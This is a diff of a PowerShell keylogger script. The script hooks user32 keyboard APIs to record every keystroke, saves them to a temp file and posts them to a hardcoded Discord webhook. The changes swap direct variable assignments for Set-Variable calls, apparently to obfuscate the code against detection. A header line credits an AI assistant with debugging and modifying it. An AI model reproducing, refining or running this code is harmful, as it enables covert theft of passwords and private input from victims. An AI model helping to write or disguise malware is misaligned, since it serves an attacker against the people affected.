@@ -2,7 +2,7 @@
 # created by: C0SM0, debugged and modified by Grok
 
 # webhook, CHANGE ME (ensure this is a valid, active Discord webhook URL)
-$webhook = "https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke"
+Set-Variable -Name webhook -Value ("https://discord.com/api/webhooks/1380976425208778935/BYngRi6W-bJS40mQiRLo6enK1A4YajR8qR0jExZTA4zuPr6i7c4G4SYUCSpPxzhllBke")
 
 # write pid
 $PID | Out-File "$env:TEMP\DdBPKCytRe"
@@ -15,7 +15,7 @@ function KeyLogger($logFile="$env:TEMP\$env:UserName.log") {
     }
 
     # API signatures
-    $APIsignatures = @'
+    Set-Variable -Name APIsignatures -Value (@'
 [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
 public static extern short GetAsyncKeyState(int virtualKeyCode);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
@@ -24,13 +24,13 @@ public static extern int GetKeyboardState(byte[] keystate);
 public static extern int MapVirtualKey(uint uCode, int uMapType);
 [DllImport("user32.dll", CharSet=CharSet.Auto)]
 public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
-'@
+'@)
 
     # set up API
-    $API = Add-Type -MemberDefinition $APIsignatures -Name 'Win32' -Namespace API -PassThru
+    Set-Variable -Name API -Value (Add-Type -Namespace API -PassThru -Name 'Win32' -MemberDefinition $APIsignatures)
 
     # track time for periodic webhook posting
-    $lastWebhookTime = Get-Date
+    Set-Variable -Name lastWebhookTime -Value (Get-Date)
 
     # attempt to log keystrokes
     try {
@@ -75,8 +75,8 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
 
             # log keystrokes
-            for ($ascii = 8; $ascii -le 254; $ascii++) {  # Start from 8 to include backspace
-                $keystate = $API::GetAsyncKeyState($ascii)
+            for (Set-Variable -Name ascii -Value (8); $ascii -le 254; $ascii++) {  # Start from 8 to include backspace
+                Set-Variable -Name keystate -Value ($API::GetAsyncKeyState($ascii))
                 if ($keystate -eq -32767) {
                     $null = [console]::CapsLock
                     $mapKey = $API::MapVirtualKey($ascii, 3)
@@ -98,7 +98,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
     finally {
         # send any remaining logs on exit
         try {
-            $logs = Get-Content -Path $logFile -Raw -Encoding Unicode
+            Set-Variable -Name logs -Value (Get-Content -Encoding Unicode -Path $logFile -Raw)
             if ($logs) {
                 $logs = $logs.Substring(0, [Math]::Min($logs.Length, 2000))
                 $logs = $logs -replace '[^\x20-\x7E]', ''
@@ -112,7 +112,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
             }
         }
         catch {
-            $errorMessage = $_.Exception.Message
+            Set-Variable -Name errorMessage -Value ($_.Exception.Message)
             if ($_.Exception.Response) {
                 $responseStream = $_.Exception.Response.GetResponseStream()
                 $reader = New-Object System.IO.StreamReader($responseStream)
